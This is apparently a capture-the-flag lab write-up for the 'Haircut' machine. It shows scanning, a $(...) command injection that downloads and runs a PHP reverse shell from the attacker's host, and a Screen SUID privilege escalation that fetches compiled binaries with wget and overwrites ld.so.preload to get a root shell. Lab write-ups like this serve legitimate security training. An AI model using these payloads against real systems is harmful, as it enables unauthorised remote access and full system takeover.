## Haircut

Difficulty: Medium

### User Flag

```
nmap 10.10.10.24 -T4
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/63b9967d-de79-41db-95f3-90218b0d6c55)

<br>

Enumerating port 80, we find exposed.php.

```
gobuster dir -u http://hairdresser.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40 -x php
```

![goBuster](https://github.com/b1d0ws/OSCP/assets/58514930/2414d7d2-90fa-40ea-908a-cddbf00a66ff)

<br>

There is this funcionality that use curl on the URL inputted.

![exposedPHP](https://github.com/b1d0ws/OSCP/assets/58514930/f7fdf28f-f133-4340-9cfd-54352708819b)

<br>

We can do some command injection with $(COMMAND). Other injections with "; & |" are blocked.

![firstInjection](https://github.com/b1d0ws/OSCP/assets/58514930/9c1770d6-8ac7-495a-a9da-ef31ca73db53)

<br>

To exploit this, we can upload a php-reverse-shell and execute it.

```
http://10.10.14.11/php-reverse-shell.php -o /tmp/php-reverse-shell.php
http://$(php /tmp/php-reverse-shell.php)
```

### Root Flag

Enumerating SUID bits, there is Screen binary that is uncommon.

![suid](https://github.com/b1d0ws/OSCP/assets/58514930/54c4d7cc-9272-4a01-9276-5e8878b5ccc3)

<br>

Searching for it, we find a [exploit](https://www.exploit-db.com/exploits/41154) for this.

![findingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/9e610fc2-71f3-4166-9149-f0feec7fa6e0)

<br>

Now we need to manually create the files needed to the exploit, upload them to the victim and them execute the final of the exploit

```bash

# On Our Machine
nano libhax.c
gcc -fPIC -shared -ldl -o libhax.so libhax.c
nano rootshell.c
gcc -o rootshell rootshell.c

# On Victim Machine
# Upload the 2 compiled files python to /tmp directory
wget http://10.10.14.11:9006/libhax.so && wget http://10.10.14.11:9006/rootshell
chmod +x libhax.so rootshell
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

![compilingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/e2d94e21-d4e9-4661-9649-da9845a12898)

![gettingRoot](https://github.com/b1d0ws/OSCP/assets/58514930/5a548717-ce0a-424a-a59a-ffac28ff67cd)
